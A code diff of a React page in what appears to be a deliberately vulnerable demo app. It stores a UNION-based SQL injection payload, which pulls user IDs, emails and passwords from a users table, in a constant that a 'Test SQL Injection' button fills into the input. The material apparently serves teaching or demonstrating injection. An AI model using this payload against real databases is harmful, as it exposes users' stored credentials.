@@ -20,6 +20,9 @@ export default function Home() {
 	const [sqlInput, setSqlInput] = useState("")
 	const [data, setData] = useState<string | undefined | null>(undefined)
 
+	const sqlInjectionQuery =
+		"t' OR 1=1 UNION ALL SELECT users.user_id, users.email, users.password, users.email as email1, users.user_id as id, users.user_id as id1, users.user_id as id2 FROM users WHERE 1='1"
+
 	useEffect(() => {
 		const fetchSession = async () => {
 			const temp = await sessionCheck()
@@ -154,16 +157,14 @@ export default function Home() {
 										: "btn-outline-error"
 								}`}
 								onClick={handleTestSQL}>
-								Test SQL
+								Get Pets
 							</button>
 						</div>
 						<div className="flex items-center w-full justify-evenly">
 							<button
 								className="btn btn-outline-secondary"
 								onClick={() => {
-									setSqlInput(
-										"t' OR 1=1 UNION ALL SELECT users.user_id, users.email, users.password, users.email as email1, users.user_id as id, users.user_id as id1, users.user_id as id2 FROM users"
-									)
+									setSqlInput(sqlInjectionQuery)
 								}}>
 								Test SQL Injection
 							</button>
